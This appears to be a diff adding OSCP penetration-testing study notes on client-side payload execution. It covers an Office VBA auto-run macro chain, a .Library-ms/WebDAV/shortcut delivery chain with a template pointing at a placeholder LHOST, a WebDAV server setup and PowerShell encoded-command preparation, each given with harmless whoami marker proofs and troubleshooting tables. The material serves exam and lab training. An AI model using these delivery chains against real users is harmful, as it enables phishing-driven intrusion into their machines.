+<li>Match the exact handler and session lifecycle, then inspect actual packet direction: <a href="/oscp/notes/methods/execution/#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>; <a href="/oscp/notes/methods/execution/#execution-framework">Use a framework module with explicit target and feature constraints</a>; <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</li>
+</ol>
+<p><strong>Decision rule:</strong> an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.</p>
+<h2 id="method-families">Method families</h2>
+<ul>
+<li><strong>Client-side delivery and interaction:</strong> <a href="#execution-office">Use a gated Office macro delivery chain</a>, <a href="#execution-library">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</a>.</li>
+<li><strong>Format, parser and control boundaries:</strong> <a href="#execution-format">Match an artifact to its executable consumer and runtime</a>, <a href="#execution-parser">Repair quoting, encoding and command-length boundaries</a>, <a href="#execution-powershell">Distinguish PowerShell policy, language mode and protected execution layers</a>, <a href="#execution-controls">Interpret endpoint-control evidence and select a justified alternative</a>.</li>
+<li><strong>Handlers, framework state and callbacks:</strong> <a href="#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>, <a href="#execution-framework">Use a framework module with explicit target and feature constraints</a>, <a href="#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</li>
+</ul>
+<h2 id="choose-a-method">Choose a method</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Recognition clue</th><th>Required access</th><th>Enabling conditions</th><th>Resulting capability</th></tr></thead><tbody><tr><td><a href="#execution-office">Use a gated Office macro delivery chain</a></td><td>An assigned client-side scenario includes Office and a document-open interaction</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy</td><td>A verified document-triggered command effect under the opening user's identity</td></tr><tr><td><a href="#execution-library">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</a></td><td>A client-side scenario permits a Library file and remote share presentation</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action</td><td>A verified shortcut-triggered command under the interacting user's identity</td></tr><tr><td><a href="#execution-format">Match an artifact to its executable consumer and runtime</a></td><td>A downloaded/generated artifact exists but does not run</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format</td><td>A correctly identified artifact/runtime boundary and a suitable execution choice</td></tr><tr><td><a href="#execution-parser">Repair quoting, encoding and command-length boundaries</a></td><td>A simple command works while a longer or nested payload fails</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Known outer request/template/database parser and inner shell; correct character encoding and transport length</td><td>A command representation that survives every required parser</td></tr><tr><td><a href="#execution-powershell">Distinguish PowerShell policy, language mode and protected execution layers</a></td><td>PowerShell reports scripts disabled, constrained syntax or an execution-control error</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Actual host policy/language context and a supported allowed execution route; required runtime features remain available</td><td>An evidence-based diagnosis and compatible execution choice</td></tr><tr><td><a href="#execution-controls">Interpret endpoint-control evidence and select a justified alternative</a></td><td>An artifact disappears, a process is blocked, or execution is stopped with a policy/security event</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold</td><td>A supported failure classification and selected alternative delivery/execution path</td></tr><tr><td><a href="#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a></td><td>A payload connects without a session, or a handler/session exits unexpectedly</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration</td><td>A verified intended session rather than merely a connected socket</td></tr><tr><td><a href="#execution-framework">Use a framework module with explicit target and feature constraints</a></td><td>A reviewed module fits a verified exploit prerequisite set</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>Correct module/target/options, accepted payload/delivery route and the applicable current exam feature/target restrictions</td><td>An independently verified module effect and a tracked framework context</td></tr><tr><td><a href="#execution-callback">Diagnose connection direction, listener and session failures in order</a></td><td>Command execution or payload delivery exists but the expected usable channel does not</td><td>A recorded delivery/execution chain with the expected consumer and effect</td><td>A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence</td><td>The first failed delivery/execution/transport/session boundary and a targeted next test</td></tr></tbody></table>
+<p><a id="execution-office"></a></p>
+<h2 id="use-a-gated-office-macro-delivery-chain">Use a gated Office macro delivery chain</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#31-office-macro-chain">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result">1. Purpose and result</h3>
+<p>A verified document-triggered command effect under the opening user's identity.</p>
+<h3 id="2-recognition-clues">2. Recognition clues</h3>
+<p>An assigned client-side scenario includes Office and a document-open interaction.</p>
+<h4 id="find-the-clue-from-your-starting-access">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-Item .\FILE -Stream *
+Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Zone.Identifier present
+ZoneId=3
+Office interaction: document opens; macro execution not observed
+</code></pre>
+<p><strong>Recognize this detail:</strong> Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity.</p>
+<p><strong>Still missing before method selection:</strong> Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The permitted interaction triggers the expected bounded command effect: choose the supported delivery chain.</td></tr><tr><td>Ruled out in this context</td><td>Office/policy blocks the required macro path: reject this chain under those conditions.</td></tr><tr><td>Inconclusive</td><td>A missing callback with no trigger evidence leaves execution unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy.</p>
+<h3 id="4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Get-Item .\FILE -Stream *
+Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue
+</code></pre>
+<h3 id="5-why-it-works">5. Why it works</h3>
+<p>Delivery, document open, macro enablement and child-process execution are separate gates. Mark of the Web and current Office policy can block a chain before any callback occurs.</p>
+<h3 id="6-execute-and-choose-variants">6. Execute and choose variants</h3>
+<p>Use a macro-enabled format such as <code>.docm</code> or a legacy <code>.doc</code>; <code>.docx</code> does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is:</p>
+<pre><code class="language-vb">Sub AutoOpen()
+    RunProof
+End Sub
+
+Sub Document_Open()
+    RunProof
+End Sub
+
+Sub RunProof()
+    CreateObject("WScript.Shell").Run _
+        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
+End Sub
+</code></pre>
+<p><code>AutoOpen</code> and <code>Document_Open</code> cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed.</p>
+<p>Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include:</p>
+<ul>
+<li>file format actually supports the macro;</li>
+<li>macro is stored in the delivered document;</li>
+<li>MOTW/Zone Identifier and security zone;</li>
+<li>Protected View and Trust Center settings;</li>
+<li>signed publisher or Trusted Location decisions;</li>
+<li>organization GPO that the user cannot override;</li>
+<li>user opened the document and performed the required permitted action;</li>
+<li>Office launched the expected child process;</li>
+<li>the child command survived VBA, CMD and PowerShell quoting;</li>
+<li>delivery and callback network paths both work.</li>
+</ul>
+<p>Inspect a file's zone without changing it:</p>
+<pre><code class="language-powershell">Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
+Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier
+</code></pre>
+<p><code>ZoneId=3</code> represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy.</p>
+<h3 id="7-worked-example--hypothetical">7. Worked example — hypothetical</h3>
+<p>Observation: the document is delivered but no shell appears. Test: inspect the open/macro-trigger and policy gates first. Illustrative output: macros are blocked before the command executes. Interpretation: the callback is not yet the failed boundary.</p>
+<h3 id="8-verify-the-result">8. Verify the result</h3>
+<p>Verify the actual macro-triggered effect and user context; document receipt is not execution.</p>
+<h3 id="9-failure-and-fallback">9. Failure and fallback</h3>
+<p>Missing Office, absent interaction, blocked internet macros or incompatible content invalidates the chosen chain. Use a method supported by the assigned scenario.</p>
+<h3 id="10-next-transitions">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>; <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-windows">Use Windows authenticated access or a PowerShell command channel</a>.</p>
+<p><a id="execution-library"></a></p>
+<h2 id="use-a-windows-librarywebdavshortcut-chain-with-explicit-interaction">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#32-windows-library-file-plus-shortcut">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-1">1. Purpose and result</h3>
+<p>A verified shortcut-triggered command under the interacting user's identity.</p>
+<h3 id="2-recognition-clues-1">2. Recognition clues</h3>
+<p>A client-side scenario permits a Library file and remote share presentation.</p>
+<h4 id="find-the-clue-from-your-starting-access-1">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-Content .\FILE.library-ms
+Test-NetConnection LHOST -Port PORT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Library resource: http://LHOST:PORT/
+Remote folder request: observed
+Shortcut launch: not observed
+</code></pre>
+<p><strong>Recognize this detail:</strong> The resource can be presented while the executable user interaction is still absent.</p>
+<p><strong>Still missing before method selection:</strong> Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The intended launch and resulting user-context command are observed: use the supported chain.</td></tr><tr><td>Ruled out in this context</td><td>The client cannot consume the resource or never performs the required allowed launch: reject that interaction path.</td></tr><tr><td>Inconclusive</td><td>A WebDAV GET alone leaves code execution unproved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-1">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action.</p>
+<h3 id="4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Test-NetConnection LHOST -Port PORT
+Get-Item .\FILE -Stream *
+</code></pre>
+<h3 id="5-why-it-works-1">5. Why it works</h3>
+<p>The Library describes a resource; browsing it is different from launching a shortcut. WebDAV access, file presentation and process execution are separate conditions.</p>
+<h3 id="6-execute-and-choose-variants-1">6. Execute and choose variants</h3>
+<p>A <code>.Library-ms</code> file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:</p>
+<pre><code class="language-text">delivered .Library-ms
+→ user opens library
+→ Explorer reaches WebDAV location
+→ user opens .lnk
+→ shortcut launches chosen command
+→ optional download/callback
+</code></pre>
+<p>If WsgiDAV is already installed, publish a dedicated authorized-lab directory:</p>
+<pre><code class="language-bash">mkdir -p webdav
+wsgidav --host=0.0.0.0 --port=80 \
+  --root=./webdav --auth=anonymous
+</code></pre>
+<blockquote>
+<p>Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
+Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.</p>
+</blockquote>
+<p>Original library template using placeholders:</p>
+<pre><code class="language-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
+&#x3C;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  &#x3C;name>@windows.storage.dll,-34582&#x3C;/name>
+  &#x3C;version>1&#x3C;/version>
+  &#x3C;isLibraryPinned>true&#x3C;/isLibraryPinned>
+  &#x3C;iconReference>imageres.dll,-1002&#x3C;/iconReference>
+  &#x3C;templateInfo>
+    &#x3C;folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}&#x3C;/folderType>
+  &#x3C;/templateInfo>
+  &#x3C;searchConnectorDescriptionList>
+    &#x3C;searchConnectorDescription>
+      &#x3C;isDefaultSaveLocation>true&#x3C;/isDefaultSaveLocation>
+      &#x3C;isSupported>false&#x3C;/isSupported>
+      &#x3C;simpleLocation>
+        &#x3C;url>http://LHOST/&#x3C;/url>
+      &#x3C;/simpleLocation>
+    &#x3C;/searchConnectorDescription>
+  &#x3C;/searchConnectorDescriptionList>
+&#x3C;/libraryDescription>
+</code></pre>
+<p>Save it with a <code>.Library-ms</code> extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.</p>
+<p>Create a shortcut on a controlled Windows preparation host:</p>
+<pre><code class="language-powershell">$shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
+$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
+$shortcut.WorkingDirectory = $env:TEMP
+$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
+$shortcut.Save()
+</code></pre>
+<p>Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:</p>
+<pre><code class="language-text">Explorer → WebDAV
+shortcut command → optional payload/download server
+executed payload → listener/handler
+</code></pre>
+<p>Failure cues:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Next boundary</th></tr></thead><tbody><tr><td>Library opens empty</td><td>WebDAV bind, reachability, WebClient/policy, modified library serialization</td></tr><tr><td>WebDAV receives nothing</td><td>Artifact not opened, URL/port wrong, client route or WebDAV blocked</td></tr><tr><td>Directory appears; shortcut never runs</td><td>Required second user action absent or shortcut blocked</td></tr><tr><td>Marker works; download absent</td><td>Command quoting, DNS and payload-server route</td></tr><tr><td>Download occurs; no execution</td><td>Format, permissions, policy, quarantine or dependency</td></tr><tr><td>Execution proven; no callback</td><td>Listener, route, payload/handler compatibility</td></tr></tbody></table>
+<h3 id="7-worked-example--hypothetical-1">7. Worked example — hypothetical</h3>
+<p>Observation: the Library opens the remote location but no command executes. Test: verify whether the shortcut was actually launched and its target parsed. Illustrative output: only directory browsing occurred. Interpretation: the interaction trigger remains missing.</p>
+<h3 id="8-verify-the-result-1">8. Verify the result</h3>
+<p>Verify the launched command's identity/effect and distinguish WebDAV requests from execution.</p>
+<h3 id="9-failure-and-fallback-1">9. Failure and fallback</h3>
+<p>Unavailable WebDAV client, blocked remote path, missing shortcut interaction or policy can stop the chain before a callback.</p>
+<h3 id="10-next-transitions-1">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>; <a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<p><a id="execution-format"></a></p>
+<h2 id="match-an-artifact-to-its-executable-consumer-and-runtime">Match an artifact to its executable consumer and runtime</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#4-match-artifact-to-its-consumer">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-2">1. Purpose and result</h3>
+<p>A correctly identified artifact/runtime boundary and a suitable execution choice.</p>
+<h3 id="2-recognition-clues-2">2. Recognition clues</h3>
+<p>A downloaded/generated artifact exists but does not run.</p>
+<h4 id="find-the-clue-from-your-starting-access-2">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">file FILE
+sha256sum FILE
+readelf -l FILE 2>/dev/null
+uname -m
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">FILE: ELF 32-bit
+Requested interpreter: /PATH/TO/LOADER
+Execution error: No such file or directory
+</code></pre>
+<p><strong>Recognize this detail:</strong> An existing file can fail because its loader/runtime is missing; this is separate from callback failure.</p>
+<p><strong>Still missing before method selection:</strong> Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The matching consumer loads intact bytes and the minimal effect works: choose that artifact.</td></tr><tr><td>Ruled out in this context</td><td>A PE/ELF/DLL or architecture mismatch is incompatible with the intended consumer: reject that artifact.</td></tr><tr><td>Inconclusive</td><td>A file-exists check without loader/hash evidence leaves the failure layer unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-2">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format.</p>
+<h3 id="4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">file FILE
+sha256sum FILE
+readelf -l FILE 2>/dev/null
+uname -m
+</code></pre>
+<h3 id="5-why-it-works-2">5. Why it works</h3>
+<p>A file may exist while its dynamic loader is missing. A 64-bit OS can host a 32-bit consumer, and a DLL is not interchangeable with an EXE or script.</p>
+<h3 id="6-execute-and-choose-variants-2">6. Execute and choose variants</h3>
+<p>The file extension is not the execution contract. Record all of these:</p>
+<pre><code class="language-text">target OS and build
+target process architecture
+artifact format
+loader/interpreter
+execution identity and integrity
+working directory and PATH
+required runtime/libraries
+arguments and quoting
+network direction
+handler protocol
+</code></pre>
+<h5 id="41-linux-checks">4.1 Linux checks</h5>
+<pre><code class="language-bash">uname -a
+uname -m
+file PAYLOAD
+readelf -h PAYLOAD | sed -n '1,25p'
+ldd PAYLOAD
+ls -l PAYLOAD
+findmnt -T /PATH/TO/PAYLOAD
+head -n 1 SCRIPT
+</code></pre>
+<p>Common interpretations:</p>
+<ul>
+<li><code>Exec format error</code>: wrong format/architecture or invalid interpreter line;</li>
+<li><code>Permission denied</code>: missing execute permission, inaccessible parent directory, <code>noexec</code>, policy or identity issue;</li>
+<li><code>No such file or directory</code> when the file exists: missing dynamic loader or broken shebang interpreter;</li>
+<li>missing shared object: runtime library mismatch;</li>
+<li><code>^M</code> in a shebang: CRLF line endings changed the interpreter path;</li>
+<li>works interactively but not through cron/service: environment, working directory, shell, identity or route differs.</li>
+</ul>
+<h5 id="42-windows-checks">4.2 Windows checks</h5>
+<pre><code class="language-powershell">Get-CimInstance Win32_OperatingSystem |
+  Select-Object Caption,Version,BuildNumber,OSArchitecture
+
+[Environment]::Is64BitOperatingSystem
+[Environment]::Is64BitProcess
+$env:PROCESSOR_ARCHITECTURE
+Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe'
+</code></pre>
+<p>Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Consumer</th><th>Required property / common failure</th></tr></thead><tbody><tr><td>Direct process creation</td><td>Compatible PE/ELF/script and dependencies</td></tr><tr><td>Windows service</td><td>Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program</td></tr><tr><td>DLL loader/hijack</td><td>Correct bitness, expected exports and dependency behavior</td></tr><tr><td><code>msiexec</code></td><td>Valid MSI package, not an EXE renamed <code>.msi</code></td></tr><tr><td>PowerShell</td><td>Valid syntax, edition/runtime compatibility and applicable policy/control state</td></tr><tr><td>Existing memory-corruption PoC</td><td>Documented architecture, space, bad characters and exit behavior</td></tr></tbody></table>
+<h3 id="7-worked-example--hypothetical-2">7. Worked example — hypothetical</h3>
+<p>Observation: Linux says not found for an existing executable. Test: inspect its ELF interpreter and architecture. Illustrative output: the required loader is absent. Interpretation: choose a compatible artifact rather than changing callback IPs.</p>
+<h3 id="8-verify-the-result-2">8. Verify the result</h3>
+<p>Verify matching bytes, consumer and actual minimal execution effect; on Windows inspect PE architecture/runtime and resulting process.</p>
+<h3 id="9-failure-and-fallback-2">9. Failure and fallback</h3>
+<p>Permission, mount policy, CRLF/shebang, missing runtime and architecture mismatches require different fixes.</p>
+<h3 id="10-next-transitions-2">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>; <a href="/oscp/notes/methods/sessions-transfers/#payload-generate">Generate a payload matching OS, process, format and handler</a>; <a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>; <a href="/oscp/notes/methods/execution/#execution-office">Use a gated Office macro delivery chain</a>; <a href="/oscp/notes/methods/execution/#execution-library">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</a>.</p>
+<p><a id="execution-parser"></a></p>
+<h2 id="repair-quoting-encoding-and-command-length-boundaries">Repair quoting, encoding and command-length boundaries</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#5-parser-command-line-and-length-failures">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#diagnose-quoting-and-encoding-by-layer">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-3">1. Purpose and result</h3>
+<p>A command representation that survives every required parser.</p>
+<h3 id="2-recognition-clues-3">2. Recognition clues</h3>
+<p>A simple command works while a longer or nested payload fails.</p>
+<h4 id="find-the-clue-from-your-starting-access-3">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Compare the last working simple command with the first added quoting/encoding layer; record which parser receives each representation.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Simple id command: expected output
+Added Bash redirection through sh: syntax error
+</code></pre>
+<p><strong>Recognize this detail:</strong> The break follows a shell-language/representation change, so network or exploit applicability need not have changed.</p>
+<p><strong>Still missing before method selection:</strong> Confirm outer decoding, actual inner shell, length and correct byte/string encoding with a small test.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The exact command survives every parser and its bounded effect is verified: use that representation.</td></tr><tr><td>Ruled out in this context</td><td>The selected shell does not implement the payload syntax: reject that unwrapped expression.</td></tr><tr><td>Inconclusive</td><td>A generic server error without received/executed-command evidence needs a smaller discriminating test.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-3">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Known outer request/template/database parser and inner shell; correct character encoding and transport length.</p>
+<h3 id="4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">$command = 'whoami'
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+</code></pre>
+<h3 id="5-why-it-works-3">5. Why it works</h3>
+<p>HTTP encoding, shell quoting, PowerShell UTF-16LE encoding and application string escaping solve different transformations. Encoding is not encryption or an endpoint-control bypass.</p>
+<h3 id="6-execute-and-choose-variants-3">6. Execute and choose variants</h3>
+<p>Write the real chain:</p>
+<pre><code class="language-text">document/shortcut or HTTP/SQL/template input
+→ application parser
+→ VBA/WScript/application runtime
+→ cmd.exe /c, /bin/sh -c or PowerShell
+→ final command/payload
+</code></pre>
+<p>Start with a short marker at every layer. Check:</p>
+<ul>
+<li>quote ownership at each layer;</li>
+<li>expansion of <code>%VAR%</code>, <code>$VAR</code> and PowerShell variables;</li>
+<li>metacharacters such as <code>&#x26;</code>, <code>|</code>, <code>&#x3C;</code>, <code>></code>, <code>;</code>, backticks and parentheses;</li>
+<li>URL/JSON/XML/Base64 decode count;</li>
+<li>command-line, VBA-string, request-field or exploit-buffer length;</li>
+<li>current directory and relative paths.</li>
+</ul>
+<p>PowerShell encoded-command preparation:</p>
+<pre><code class="language-powershell">$command = 'COMMAND'
+$bytes = [Text.Encoding]::Unicode.GetBytes($command)
+[Convert]::ToBase64String($bytes)
+</code></pre>
+<pre><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
+</code></pre>
+<p><code>-EncodedCommand</code> uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.</p>
+<p>Write the parser chain explicitly:</p>
+<pre><code class="language-text">HTTP/SQL/template parser
+→ application language
+→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell)
+→ target shell/interpreter
+→ payload command
+</code></pre>
+<p>Test each layer with a small command. Encode only for the layer that consumes the characters:</p>
+<pre><code class="language-bash">python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))'
+</code></pre>
+<p>Typical failures:</p>
+<ul>
+<li><code>&#x26;</code>, <code>|</code>, <code>></code>, <code>&#x3C;</code>, <code>$</code>, backticks, quotes or spaces consumed by an outer shell;</li>
+<li>URL decoding occurs zero, one or two times;</li>
+<li>JSON, XML, SQL or template quoting changes the command;</li>
+<li>PowerShell receives UTF-8 Base64 instead of required UTF-16LE;</li>
+<li>payload length exceeds a field, command line or exploit buffer;</li>
+<li>32-bit payload is injected into a 64-bit context or the reverse.</li>
+</ul>
+<h3 id="7-worked-example--hypothetical-3">7. Worked example — hypothetical</h3>
+<p>Observation: a Bash redirection fails through an application using sh. Test: wrap the Bash-specific expression in the intended interpreter and correctly encode the outer request. Illustrative output: the minimal command succeeds. Interpretation: add the connection step only after parser proof.</p>
+<h3 id="8-verify-the-result-3">8. Verify the result</h3>
+<p>Verify received/executed command behavior at each parser boundary with small discriminating tests.</p>
+<h3 id="9-failure-and-fallback-3">9. Failure and fallback</h3>
+<p>Truncation, double decoding or mismatched shell syntax should not be treated as missing network connectivity.</p>
+<h3 id="10-next-transitions-3">10. Next transitions</h3>
